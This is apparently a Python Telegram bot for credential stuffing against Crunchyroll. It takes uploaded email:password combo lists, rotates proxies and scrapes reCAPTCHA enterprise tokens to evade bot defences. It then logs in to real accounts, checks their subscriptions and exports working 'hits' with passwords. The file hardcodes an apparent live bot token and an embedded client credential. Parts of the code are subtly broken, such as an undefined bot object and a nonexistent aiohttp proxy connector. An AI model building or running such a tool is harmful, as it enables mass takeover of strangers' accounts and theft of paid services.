import asyncio
import json
import aiosqlite
import aiohttp
import random
import string
import logging
from datetime import datetime
from typing import Optional, Dict, Any, List, Tuple
from dataclasses import dataclass, asdict
from aiogram import Bot, Dispatcher, F, Router
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, BufferedInputFile
from aiogram.filters import Command
from aiogram.enums import ParseMode
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.exceptions import TelegramAPIError

# Configuration
BOT_TOKEN = "8237272070:AAG-jMJFqpS5H8BRhPWt7uQB8omQJeMbBdc"
ADMIN_IDS = [7935621079]  # Replace with your Telegram ID
DB_PATH = "crunchyroll_checker.db"
DEFAULT_WORKERS = 5
DEFAULT_TIMEOUT = 20

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Data Models
@dataclass
class CheckResult:
    email: str
    password: str
    status: str  # HIT, FREE, FAIL, RETRY, BAN
    subscription: Optional[str] = None
    plan_type: Optional[str] = None
    expiry: Optional[str] = None
    captured_data: Optional[Dict] = None
    error: Optional[str] = None
    proxy_used: Optional[str] = None
    checked_at: Optional[str] = None

@dataclass
class Proxy:
    id: int
    url: str
    type: str
    uses: int
    fails: int
    is_active: bool = True

# Database Manager
class Database:
    def __init__(self, db_path: str):
        self.db_path = db_path
    
    async def init(self):
        async with aiosqlite.connect(self.db_path) as db:
            # Combos table
            await db.execute('''CREATE TABLE IF NOT EXISTS combos (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                email TEXT,
                password TEXT,
                status TEXT DEFAULT 'unchecked',
                result TEXT,
                subscription TEXT,
                plan_type TEXT,
                expiry TEXT,
                checked_at TIMESTAMP,
                proxy_used TEXT,
                error_msg TEXT
            )''')
            
            # Stats table
            await db.execute('''CREATE TABLE IF NOT EXISTS stats (
                id INTEGER PRIMARY KEY,
                total_checked INTEGER DEFAULT 0,
                hits INTEGER DEFAULT 0,
                frees INTEGER DEFAULT 0,
                fails INTEGER DEFAULT 0,
                retries INTEGER DEFAULT 0,
                cpm INTEGER DEFAULT 0,
                last_check TIMESTAMP,
                current_session TEXT
            )''')
            
            # Proxies table
            await db.execute('''CREATE TABLE IF NOT EXISTS proxies (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                url TEXT UNIQUE,
                type TEXT DEFAULT 'http',
                uses INTEGER DEFAULT 0,
                fails INTEGER DEFAULT 0,
                is_active BOOLEAN DEFAULT 1,
                last_used TIMESTAMP,
                response_time REAL,
                added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )''')
            
            # Settings table
            await db.execute('''CREATE TABLE IF NOT EXISTS settings (
                key TEXT PRIMARY KEY,
                value TEXT
            )''')
            
            # Insert default stats
            await db.execute("INSERT OR IGNORE INTO stats (id) VALUES (1)")
            await db.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('workers', ?)", (str(DEFAULT_WORKERS),))
            await db.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('timeout', ?)", (str(DEFAULT_TIMEOUT),))
            await db.commit()
    
    async def get_stats(self) -> Dict:
        async with aiosqlite.connect(self.db_path) as db:
            db.row_factory = aiosqlite.Row
            cursor = await db.execute("SELECT * FROM stats WHERE id=1")
            row = await cursor.fetchone()
            return dict(row) if row else {}
    
    async def update_stats(self, **kwargs):
        async with aiosqlite.connect(self.db_path) as db:
            fields = []
            values = []
            for key, value in kwargs.items():
                fields.append(f"{key} = {key} + ?")
                values.append(value)
            if fields:
                values.append(1)  # id
                await db.execute(f"UPDATE stats SET {', '.join(fields)}, last_check=CURRENT_TIMESTAMP WHERE id=?", values)
                await db.commit()
    
    async def get_setting(self, key: str, default=None):
        async with aiosqlite.connect(self.db_path) as db:
            cursor = await db.execute("SELECT value FROM settings WHERE key=?", (key,))
            row = await cursor.fetchone()
            return row[0] if row else default
    
    async def set_setting(self, key: str, value: str):
        async with aiosqlite.connect(self.db_path) as db:
            await db.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", (key, value))
            await db.commit()
    
    async def get_unchecked_combos(self, limit: int = 100) -> List[Tuple]:
        async with aiosqlite.connect(self.db_path) as db:
            cursor = await db.execute(
                "SELECT id, email, password FROM combos WHERE status='unchecked' LIMIT ?", (limit,))
            return await cursor.fetchall()
    
    async def update_combo(self, combo_id: int, result: CheckResult):
        async with aiosqlite.connect(self.db_path) as db:
            await db.execute('''UPDATE combos SET 
                status=?, subscription=?, plan_type=?, expiry=?, 
                checked_at=CURRENT_TIMESTAMP, proxy_used=?, error_msg=?, result=?
                WHERE id=?''', (
                result.status, result.subscription, result.plan_type, result.expiry,
                result.proxy_used, result.error, json.dumps(asdict(result)) if result.captured_data else None,
                combo_id
            ))
            await db.commit()
    
    async def add_combos(self, combos: List[Tuple[str, str]]):
        async with aiosqlite.connect(self.db_path) as db:
            await db.executemany("INSERT OR IGNORE INTO combos (email, password) VALUES (?, ?)", combos)
            await db.commit()
    
    async def clear_combos(self, status: Optional[str] = None):
        async with aiosqlite.connect(self.db_path) as db:
            if status:
                await db.execute("DELETE FROM combos WHERE status=?", (status,))
            else:
                await db.execute("DELETE FROM combos")
            await db.commit()
    
    async def add_proxies(self, proxies: List[str]):
        async with aiosqlite.connect(self.db_path) as db:
            for proxy in proxies:
                proxy = proxy.strip()
                if proxy and '://' in proxy:
                    ptype = proxy.split('://')[0]
                    await db.execute("INSERT OR IGNORE INTO proxies (url, type) VALUES (?, ?)", (proxy, ptype))
            await db.commit()
    
    async def get_active_proxies(self) -> List[Proxy]:
        async with aiosqlite.connect(self.db_path) as db:
            db.row_factory = aiosqlite.Row
            cursor = await db.execute("SELECT * FROM proxies WHERE is_active=1 ORDER BY fails ASC, uses ASC")
            rows = await cursor.fetchall()
            return [Proxy(**dict(row)) for row in rows]
    
    async def update_proxy_stats(self, proxy_id: int, success: bool, response_time: float = 0):
        async with aiosqlite.connect(self.db_path) as db:
            if success:
                await db.execute('''UPDATE proxies SET uses=uses+1, response_time=?, last_used=CURRENT_TIMESTAMP 
                                  WHERE id=?''', (response_time, proxy_id))
            else:
                await db.execute('''UPDATE proxies SET fails=fails+1, uses=uses+1, last_used=CURRENT_TIMESTAMP 
                                  WHERE id=?''', (proxy_id,))
                # Deactivate if too many fails
                await db.execute('''UPDATE proxies SET is_active=0 WHERE id=? AND fails > 5''', (proxy_id,))
            await db.commit()
    
    async def get_hits(self) -> List[Dict]:
        async with aiosqlite.connect(self.db_path) as db:
            db.row_factory = aiosqlite.Row
            cursor = await db.execute("SELECT * FROM combos WHERE status='HIT' ORDER BY checked_at DESC")
            rows = await cursor.fetchall()
            return [dict(row) for row in rows]
    
    async def get_recent_logs(self, limit: int = 10) -> List[Dict]:
        async with aiosqlite.connect(self.db_path) as db:
            db.row_factory = aiosqlite.Row
            cursor = await db.execute(
                "SELECT email, status, subscription, checked_at FROM combos WHERE status!='unchecked' ORDER BY checked_at DESC LIMIT ?", 
                (limit,))
            return [dict(row) for row in cursor.fetchall()]

# Proxy Manager with Rotation
class ProxyManager:
    def __init__(self, db: Database):
        self.db = db
        self.proxies: List[Proxy] = []
        self.current_index = 0
        self.lock = asyncio.Lock()
    
    async def load_proxies(self):
        self.proxies = await self.db.get_active_proxies()
        logger.info(f"Loaded {len(self.proxies)} active proxies")
    
    async def get_next_proxy(self) -> Optional[Proxy]:
        async with self.lock:
            if not self.proxies:
                await self.load_proxies()
            if not self.proxies:
                return None
            
            proxy = self.proxies[self.current_index]
            self.current_index = (self.current_index + 1) % len(self.proxies)
            return proxy
    
    async def report_result(self, proxy: Proxy, success: bool, response_time: float = 0):
        await self.db.update_proxy_stats(proxy.id, success, response_time)

# Crunchyroll Checker
class CrunchyrollChecker:
    def __init__(self, db: Database, proxy_manager: ProxyManager):
        self.db = db
        self.proxy_manager = proxy_manager
        self.ua_pool = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:148.0) Gecko/20100101 Firefox/148.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        ]
        self.running = False
        self.stats_cache = {"checked": 0, "hits": 0, "frees": 0, "fails": 0, "start_time": None}
    
    def get_random_ua(self):
        return random.choice(self.ua_pool)
    
    async def solve_recaptcha(self, session: aiohttp.ClientSession) -> Optional[str]:
        try:
            anchor_url = "https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6LeQj_wUAAAAABLdMxMxFF-x3Jvyd1hkbsRV9UAk&co=aHR0cHM6Ly9zc28uY3J1bmNoeXJvbGwuY29tOjQ0Mw..&hl=en&v=qm3PSRIx10pekcnS9DjGnjPW&theme=dark&size=invisible"
            
            async with session.get(anchor_url) as resp:
                html = await resp.text()
                
            start = html.find('id="recaptcha-token" value="') + len('id="recaptcha-token" value="')
            end = html.find('"', start)
            if start == -1 or end == -1:
                return None
            recaptcha_token = html[start:end]
            
            reload_url = "https://www.google.com/recaptcha/enterprise/reload?k=6LeQj_wUAAAAABLdMxMxFF-x3Jvyd1hkbsRV9UAk"
            payload = f"v=w0_qmZVSdobukXrBwYd9dTF7&reason=q&c={recaptcha_token}"
            
            async with session.post(reload_url, data=payload, headers={"Content-Type": "application/x-www-form-urlencoded"}) as resp:
                result = await resp.text()
                
            start = result.find('"rresp","') + len('"rresp","')
            end = result.find('",', start)
            if start == -1 or end == -1:
                return None
            return result[start:end]
        except Exception as e:
            logger.error(f"Recaptcha error: {e}")
            return None
    
    async def check_single(self, combo_id: int, email: str, password: str, proxy: Optional[Proxy] = None) -> CheckResult:
        start_time = datetime.now()
        proxy_url = proxy.url if proxy else None
        
        connector = aiohttp.ProxyConnector.from_url(proxy_url) if proxy_url else None
        timeout = aiohttp.ClientTimeout(total=int(await self.db.get_setting('timeout', DEFAULT_TIMEOUT)))
        
        try:
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                # Step 1: Recaptcha
                recaptcha_token = await self.solve_recaptcha(session)
                if not recaptcha_token:
                    if proxy:
                        await self.proxy_manager.report_result(proxy, False)
                    return CheckResult(email, password, "RETRY", error="Recaptcha failed", proxy_used=proxy_url)
                
                # Step 2: Login
                login_payload = {
                    "email": email,
                    "password": password,
                    "recaptchaToken": recaptcha_token,
                    "eventSettings": {}
                }
                
                headers = {
                    "User-Agent": self.get_random_ua(),
                    "Accept": "*/*",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Content-Type": "application/json",
                    "Origin": "https://sso.crunchyroll.com",
                    "Referer": "https://sso.crunchyroll.com/login"
                }
                
                async with session.post("https://sso.crunchyroll.com/api/login", 
                                       json=login_payload, headers=headers) as resp:
                    login_text = await resp.text()
                
                if "invalid_credentials" in login_text:
                    if proxy:
                        await self.proxy_manager.report_result(proxy, True, (datetime.now()-start_time).total_seconds())
                    return CheckResult(email, password, "FAIL", proxy_used=proxy_url)
                
                if "retry" in login_text.lower() or resp.status == 429:
                    return CheckResult(email, password, "RETRY", error="Rate limited", proxy_used=proxy_url)
                
                # Extract cookies
                device_id = None
                etp_rt = None
                for cookie in session.cookie_jar:
                    if cookie.key == "device_id":
                        device_id = cookie.value
                    elif cookie.key == "etp_rt":
                        etp_rt = cookie.value
                
                if not device_id or not etp_rt:
                    return CheckResult(email, password, "RETRY", error="Missing auth cookies", proxy_used=proxy_url)
                
                # Step 3: Get Token
                token_payload = f"device_id={device_id}&device_type=Firefox%20on%20Windows&grant_type=etp_rt_cookie"
                token_headers = {
                    "Authorization": "Basic bm9haWhkZXZtXzZpeWcwYThsMHE6",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": self.get_random_ua()
                }
                
                async with session.post("https://www.crunchyroll.com/auth/v1/token",
                                       data=token_payload, headers=token_headers) as resp:
                    token_data = await resp.json()
                
                access_token = token_data.get("access_token")
                if not access_token:
                    return CheckResult(email, password, "RETRY", error="No access token", proxy_used=proxy_url)
                
                # Step 4: Check Subscription
                subs_headers = {
                    "Authorization": f"Bearer {access_token}",
                    "User-Agent": self.get_random_ua()
                }
                
                # Get account ID from cookies
                cr_exp = None
                for cookie in session.cookie_jar:
                    if cookie.key == "cr_exp":
                        cr_exp = cookie.value
                        break
                
                account_id = cr_exp[:36] if cr_exp else device_id[:36]
                
                async with session.get(f"https://www.crunchyroll.com/subs/v4/accounts/{account_id}/subscriptions",
                                      headers=subs_headers) as resp:
                    subs_data = await resp.json()
                
                # Report proxy success
                if proxy:
                    await self.proxy_manager.report_result(proxy, True, (datetime.now()-start_time).total_seconds())
                
                # Parse result
                subs = subs_data.get("subscriptions", [])
                if not subs:
                    return CheckResult(email, password, "FREE", 
                                     subscription="No active subscription",
                                     proxy_used=proxy_url,
                                     checked_at=datetime.now().isoformat())
                
                # Got subscription
                sub = subs[0]
                plan = sub.get("plan", "Unknown")
                status = sub.get("status", "Unknown")
                renewal = sub.get("next_renewal_date", "N/A")
                
                return CheckResult(
                    email, password, "HIT",
                    subscription=f"{plan} ({status})",
                    plan_type=plan,
                    expiry=renewal,
                    captured_data=subs_data,
                    proxy_used=proxy_url,
                    checked_at=datetime.now().isoformat()
                )
                
        except asyncio.TimeoutError:
            return CheckResult(email, password, "RETRY", error="Timeout", proxy_used=proxy_url)
        except Exception as e:
            logger.error(f"Check error for {email}: {e}")
            return CheckResult(email, password, "RETRY", error=str(e), proxy_used=proxy_url)
    
    async def check_worker(self, combo: Tuple, semaphore: asyncio.Semaphore, progress_callback):
        async with semaphore:
            combo_id, email, password = combo
            proxy = await self.proxy_manager.get_next_proxy()
            
            result = await self.check_single(combo_id, email, password, proxy)
            await self.db.update_combo(combo_id, result)
            
            # Update stats
            if result.status == "HIT":
                await self.db.update_stats(hits=1, total_checked=1)
                self.stats_cache["hits"] += 1
            elif result.status == "FREE":
                await self.db.update_stats(frees=1, total_checked=1)
                self.stats_cache["frees"] += 1
            elif result.status == "FAIL":
                await self.db.update_stats(fails=1, total_checked=1)
                self.stats_cache["fails"] += 1
            else:
                await self.db.update_stats(retries=1)
            
            self.stats_cache["checked"] += 1
            
            if progress_callback:
                await progress_callback(result)
            
            return result

# Bot Setup
storage = MemoryStorage()
dp = Dispatcher(storage=storage)
router = Router()
dp.include_router(router)

# Global instances
db = Database(DB_PATH)
proxy_manager = ProxyManager(db)
checker = CrunchyrollChecker(db, proxy_manager)
active_tasks = {}

# States
class BotStates(StatesGroup):
    uploading_combos = State()
    adding_proxy = State()
    setting_workers = State()
    setting_timeout = State()
    broadcast = State()

# UI Builders
class UIFactory:
    @staticmethod
    def main_menu(is_admin: bool = False) -> InlineKeyboardMarkup:
        kb = [
            [InlineKeyboardButton(text="🚀 Start Checker", callback_data="start_check"),
             InlineKeyboardButton(text="📊 Statistics", callback_data="stats")],
            [InlineKeyboardButton(text="📁 Manage Combos", callback_data="manage_combos"),
             InlineKeyboardButton(text="🌐 Proxies", callback_data="proxies")],
            [InlineKeyboardButton(text="⚙️ Settings", callback_data="settings"),
             InlineKeyboardButton(text="📋 Logs", callback_data="logs")]
        ]
        if is_admin:
            kb.append([InlineKeyboardButton(text="🔧 Admin Panel", callback_data="admin_panel"),
                      InlineKeyboardButton(text="☁️ Backup DB", callback_data="backup_db")])
        return InlineKeyboardMarkup(inline_keyboard=kb)
    
    @staticmethod
    def proxy_menu(count: int = 0) -> InlineKeyboardMarkup:
        return InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=f"📊 Active Proxies ({count})", callback_data="view_proxies")],
            [InlineKeyboardButton(text="➕ Add HTTP", callback_data="add_proxy_http"),
             InlineKeyboardButton(text="➕ Add SOCKS5", callback_data="add_proxy_socks5")],
            [InlineKeyboardButton(text="🔄 Rotate/Test", callback_data="test_proxies"),
             InlineKeyboardButton(text="🗑 Clear Dead", callback_data="clear_dead_proxies")],
            [InlineKeyboardButton(text="🔙 Back", callback_data="main_menu")]
        ])
    
    @staticmethod
    def combo_menu(unchecked: int = 0, hits: int = 0) -> InlineKeyboardMarkup:
        return InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=f"📤 Upload ({unchecked} waiting)", callback_data="upload_combos")],
            [InlineKeyboardButton(text="▶️ Start Check", callback_data="start_check"),
             InlineKeyboardButton(text="🛑 Stop All", callback_data="stop_check")],
            [InlineKeyboardButton(text=f"📥 Export Hits ({hits})", callback_data="export_hits"),
             InlineKeyboardButton(text="🗑 Clear Checked", callback_data="clear_checked")],
            [InlineKeyboardButton(text="🔙 Back", callback_data="main_menu")]
        ])
    
    @staticmethod
    def settings_menu(workers: int = 5, timeout: int = 20) -> InlineKeyboardMarkup:
        return InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=f"👥 Workers: {workers}", callback_data="set_workers")],
            [InlineKeyboardButton(text=f"⏱ Timeout: {timeout}s", callback_data="set_timeout")],
            [InlineKeyboardButton(text="🔔 Toggle Notifs", callback_data="toggle_notifs")],
            [InlineKeyboardButton(text="🔙 Back", callback_data="main_menu")]
        ])
    
    @staticmethod
    def checking_controls() -> InlineKeyboardMarkup:
        return InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="⏸ Pause", callback_data="pause_check"),
             InlineKeyboardButton(text="🛑 Stop", callback_data="stop_check")],
            [InlineKeyboardButton(text="📊 Live Stats", callback_data="live_stats")]
        ])

# Helpers
async def get_combo_stats():
    async with aiosqlite.connect(DB_PATH) as conn:
        cursor = await conn.execute("SELECT status, COUNT(*) FROM combos GROUP BY status")
        rows = await cursor.fetchall()
        stats = {"unchecked": 0, "HIT": 0, "FREE": 0, "FAIL": 0, "RETRY": 0}
        for status, count in rows:
            stats[status] = count
        return stats

# Handlers
@router.message(Command("start"))
async def cmd_start(message: Message):
    await db.init()
    await proxy_manager.load_proxies()
    is_admin = message.from_user.id in ADMIN_IDS
    await message.answer(
        "🎌 *CrunchyRoll Checker Bot*\n\n"
        "✅ Multi-threaded checking\n"
        "✅ Smart proxy rotation\n"
        "✅ Real-time statistics\n"
        "✅ Advanced capture system",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=UIFactory.main_menu(is_admin)
    )

@router.callback_query(F.data == "main_menu")
async def back_menu(callback: CallbackQuery):
    await callback.answer()
    is_admin = callback.from_user.id in ADMIN_IDS
    await callback.message.edit_text(
        "🎌 *Main Menu*",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=UIFactory.main_menu(is_admin)
    )

# PROXY SYSTEM
@router.callback_query(F.data == "proxies")
async def show_proxies(callback: CallbackQuery):
    await callback.answer("Loading proxies...")
    proxies = await proxy_manager.load_proxies()
    count = len(await db.get_active_proxies())
    await callback.message.edit_text(
        f"🌐 *Proxy Manager*\n\nActive: `{count}` proxies\nRotation: `Round-Robin`",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=UIFactory.proxy_menu(count)
    )

@router.callback_query(F.data.startswith("add_proxy_"))
async def add_proxy_start(callback: CallbackQuery, state: FSMContext):
    ptype = "http" if "http" in callback.data else "socks5"
    await state.set_state(BotStates.adding_proxy)
    await state.update_data(proxy_type=ptype)
    await callback.answer(f"Send {ptype.upper()} proxies")
    await callback.message.edit_text(
        f"🌐 *Add {ptype.upper()} Proxies*\n\n"
        f"Format: `ip:port` or `user:pass@ip:port`\n"
        f"Send multiple lines for batch import.",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton(text="🔙 Cancel", callback_data="proxies")
        ]])
    )

@router.message(BotStates.adding_proxy)
async def process_proxies(message: Message, state: FSMContext):
    data = await state.get_data()
    ptype = data.get("proxy_type", "http")
    
    lines = message.text.strip().split('\n')
    valid = []
    
    for line in lines:
        line = line.strip()
        if ':' in line:
            if '://' not in line:
                line = f"{ptype}://{line}"
            valid.append(line)
    
    await db.add_proxies(valid)
    await state.clear()
    
    await message.answer(
        f"✅ Added `{len(valid)}` {ptype.upper()} proxies",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton(text="🌐 View All", callback_data="view_proxies")
        ]])
    )

@router.callback_query(F.data == "view_proxies")
async def view_proxies(callback: CallbackQuery):
    await callback.answer()
    proxies = await db.get_active_proxies()
    
    text = f"🌐 *Proxy List* ({len(proxies)} active)\n\n"
    for i, p in enumerate(proxies[:10], 1):
        status = "🟢" if p.fails < 3 else "🟡" if p.fails < 5 else "🔴"
        text += f"{status} `{p.type}` Uses:{p.uses} Fails:{p.fails}\n"
    
    if len(proxies) > 10:
        text += f"\n... and {len(proxies)-10} more"
    
    await callback.message.edit_text(
        text,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=UIFactory.proxy_menu(len(proxies))
    )

@router.callback_query(F.data == "clear_dead_proxies")
async def clear_dead(callback: CallbackQuery):
    await callback.answer("Cleaning dead proxies...")
    async with aiosqlite.connect(DB_PATH) as db_conn:
        await db_conn.execute("DELETE FROM proxies WHERE is_active=0 OR fails > 5")
        await db_conn.commit()
    await show_proxies(callback)

# COMBO SYSTEM
@router.callback_query(F.data == "manage_combos")
async def manage_combos(callback: CallbackQuery):
    await callback.answer()
    stats = await get_combo_stats()
    hits = stats.get("HIT", 0)
    unchecked = stats.get("unchecked", 0)
    await callback.message.edit_text(
        f"📁 *Combo Manager*\n\nUnchecked: `{unchecked}`\nHits: `{hits}`\nFree: `{stats.get('FREE', 0)}`",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=UIFactory.combo_menu(unchecked, hits)
    )

@router.callback_query(F.data == "upload_combos")
async def upload_combos(callback: CallbackQuery, state: FSMContext):
    await state.set_state(BotStates.uploading_combos)
    await callback.answer("Send txt file")
    await callback.message.edit_text(
        "📤 *Upload Combos*\n\nSend `.txt` file with format:\n`email:password`",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton(text="🔙 Cancel", callback_data="manage_combos")
        ]])
    )

@router.message(BotStates.uploading_combos, F.document)
async def process_combos_doc(message: Message, state: FSMContext):
    if not message.document.file_name.endswith('.txt'):
        await message.answer("❌ Only .txt files")
        return
    
    msg = await message.answer("⏳ Processing...")
    
    file = await bot.get_file(message.document.file_id)
    content = await bot.download_file(file.file_path)
    text = content.read().decode('utf-8', errors='ignore')
    
    combos = []
    for line in text.split('\n'):
        line = line.strip()
        if ':' in line:
            email, pwd = line.split(':', 1)
            combos.append((email.strip(), pwd.strip()))
    
    await db.add_combos(combos)
    await state.clear()
    await msg.delete()
    
    await message.answer(
        f"✅ Loaded `{len(combos)}` combos",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton(text="▶️ Start Check", callback_data="start_check"),
            InlineKeyboardButton(text="📁 Manage", callback_data="manage_combos")
        ]])
    )

# CHECKER SYSTEM WITH THREADS
@router.callback_query(F.data == "start_check")
async def start_check(callback: CallbackQuery):
    await callback.answer("Starting threads...")
    
    combos = await db.get_unchecked_combos(1000)
    if not combos:
        await callback.answer("❌ No combos!", show_alert=True)
        return
    
    workers = int(await db.get_setting('workers', DEFAULT_WORKERS))
    
    msg = await callback.message.edit_text(
        f"🚀 *Checker Started*\n"
        f"👥 Workers: `{workers}`\n"
        f"📋 Queue: `{len(combos)}` accounts\n"
        f"⏳ Progress: `0%`",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=UIFactory.checking_controls()
    )
    
    # Create task
    task = asyncio.create_task(run_checker(combos, workers, msg, callback.from_user.id))
    active_tasks[callback.from_user.id] = task

async def run_checker(combos: List[Tuple], workers: int, message: Message, user_id: int):
    semaphore = asyncio.Semaphore(workers)
    checker.stats_cache = {"checked": 0, "hits": 0, "frees": 0, "fails": 0, "start_time": datetime.now()}
    total = len(combos)
    
    async def progress_update(result: CheckResult):
        cache = checker.stats_cache
        progress = (cache["checked"] / total) * 100
        
        # Calculate CPM
        elapsed = (datetime.now() - cache["start_time"]).total_seconds() / 60
        cpm = int(cache["checked"] / elapsed) if elapsed > 0 else 0
        
        status_icon = "🟢" if result.status == "HIT" else "🟡" if result.status == "FREE" else "🔴"
        
        try:
            await message.edit_text(
                f"🚀 *Checking...* {status_icon}\n\n"
                f"📊 Progress: `{cache['checked']}/{total}` (`{progress:.1f}%`)\n"
                f"⚡ CPM: `{cpm}`\n"
                f"✅ Hits: `{cache['hits']}` | 🆓 Free: `{cache['frees']}` | ❌ Fail: `{cache['fails']}`\n"
                f"👤 `{result.email[:25]}...`",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=UIFactory.checking_controls()
            )
        except TelegramAPIError:
            pass
    
    # Create tasks
    tasks = [checker.check_worker(combo, semaphore, progress_update) for combo in combos]
    
    try:
        await asyncio.gather(*tasks)
    except asyncio.CancelledError:
        await message.edit_text("⏸ *Checker Paused*", reply_markup=UIFactory.main_menu(user_id in ADMIN_IDS))
        return
    
    if user_id in active_tasks:
        del active_tasks[user_id]
    
    cache = checker.stats_cache
    await message.edit_text(
        f"✅ *Check Complete*\n\n"
        f"📋 Total: `{cache['checked']}`\n"
        f"✅ Hits: `{cache['hits']}`\n"
        f"🆓 Free: `{cache['frees']}`\n"
        f"❌ Fail: `{cache['fails']}`",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton(text="📥 Export Hits", callback_data="export_hits"),
            InlineKeyboardButton(text="🔙 Menu", callback_data="main_menu")
        ]])
    )

@router.callback_query(F.data == "stop_check")
async def stop_check(callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id in active_tasks:
        active_tasks[user_id].cancel()
        await callback.answer("🛑 Stopping...")
    else:
        await callback.answer("No active checker")

# EXPORT & STATS
@router.callback_query(F.data == "export_hits")
async def export_hits(callback: CallbackQuery):
    await callback.answer("Generating file...")
    hits = await db.get_hits()
    
    if not hits:
        await callback.answer("No hits!", show_alert=True)
        return
    
    content = ""
    for hit in hits:
        content += f"{hit['email']}:{hit['password']} | {hit['subscription'] or 'No sub'}\n"
    
    file = BufferedInputFile(content.encode(), filename=f"hits_{datetime.now().strftime('%Y%m%d_%H%M')}.txt")
    await callback.message.answer_document(file, caption="✅ Hits exported")

@router.callback_query(F.data == "stats")
async def show_stats(callback: CallbackQuery):
    await callback.answer()
    stats = await db.get_stats()
    combos = await get_combo_stats()
    
    text = f"""
📊 *Statistics*

*Session:*
├ Checked: `{stats.get('total_checked', 0)}`
├ Hits: `{stats.get('hits', 0)}`
├ Free: `{stats.get('frees', 0)}`
└ Fail: `{stats.get('fails', 0)}`

*Database:*
├ Unchecked: `{combos.get('unchecked', 0)}`
├ Hits: `{combos.get('HIT', 0)}`
└ Total: `{sum(combos.values())}`
    """
    await callback.message.edit_text(
        text,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton(text="🔄 Refresh", callback_data="stats"),
            InlineKeyboardButton(text="🔙 Back", callback_data="main_menu")
        ]])
    )

# SETTINGS
@router.callback_query(F.data == "settings")
async def settings(callback: CallbackQuery):
    await callback.answer()
    workers = await db.get_setting('workers', DEFAULT_WORKERS)
    timeout = await db.get_setting('timeout', DEFAULT_TIMEOUT)
    await callback.message.edit_text(
        "⚙️ *Settings*",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=UIFactory.settings_menu(int(workers), int(timeout))
    )

@router.callback_query(F.data == "set_workers")
async def set_workers(callback: CallbackQuery, state: FSMContext):
    await state.set_state(BotStates.setting_workers)
    await callback.answer("Send number")
    await callback.message.edit_text(
        "👥 *Set Workers*\n\nSend number (1-20):\nRecommended: 5-10",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton(text="🔙 Cancel", callback_data="settings")
        ]])
    )

@router.message(BotStates.setting_workers)
async def process_workers(message: Message, state: FSMContext):
    try:
        val = int(message.text)
        if 1 <= val <= 50:
            await db.set_setting('workers', str(val))
            await state.clear()
            await message.answer(f"✅ Workers set to `{val}`", parse_mode=ParseMode.MARKDOWN)
        else:
            await message.answer("❌ Must be 1-50")
    except:
        await message.answer("❌ Invalid number")

# LOGS
@router.callback_query(F.data == "logs")
async def show_logs(callback: CallbackQuery):
    await callback.answer()
    logs = await db.get_recent_logs(10)
    
    text = "📋 *Recent Checks*\n\n"
    for log in logs:
        emoji = "🟢" if log['status'] == "HIT" else "🟡" if log['status'] == "FREE" else "🔴"
        text += f"{emoji} `{log['email'][:20]}...` - {log['status']}\n"
    
    await callback.message.edit_text(
        text,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton(text="🔙 Back", callback_data="main_menu")
        ]])
    )

# Initialize and run
async def main():
    await db.init()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
